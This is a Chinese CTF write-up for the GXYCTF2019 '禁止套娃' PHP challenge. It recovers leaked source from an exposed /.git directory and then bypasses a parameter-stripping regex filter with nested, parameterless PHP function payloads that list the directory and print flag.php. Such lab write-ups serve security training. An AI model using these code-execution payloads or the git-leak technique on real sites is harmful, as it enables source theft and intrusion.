# [GXYCTF2019]禁止套娃
TAG:PHP、GIT泄露、无参数ACE     
## 解题过程：
打开题目，并无任何有效信息，用字典扫描目录，发现/.git目录，存在源码泄露，使用githack工具获取源码  
![20210104115320](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104115320.png)  
![20210104115337](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104115337.png)  
![20210104115349](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104115349.png)  
对下载下来的源代码进行审计  
![20210104115537](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104115537.png)  
通过对源码的分析可以发现，使用正则表达式进行函数的过滤，并把字符替换掉了，使得只能通过无参数的函数  
为了找到flag，我们要尝试去扫描网站的目录，并获取源码
使用scandir('.')函数扫描当前目录下的文件，但由于参数被替换，需要使用current(localeconv())函数得到参数"."
这时的payload为：
```?exp=print_r(scandir(current(localeconv())));```  
扫描得出目录结构：  
![20210104171101](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104171101.png)  
为了从中取出flag.php，先使用```array_flip()```函数将数组的键和值交换，后使用```array_rand()```进行随机的读取  
此时的payload为：  
```?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));```  
多刷新几次就得到了  
![20210104171145](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104171145.png)  
现在来读取flag.php的源码  
因为源码中ban掉了许多关键字，常用的读取函数file_get_contents()无法使用，这里我们选择使用show_source()函数来构建payload  
```?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));```  
![20210104171339](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210104171339.png)  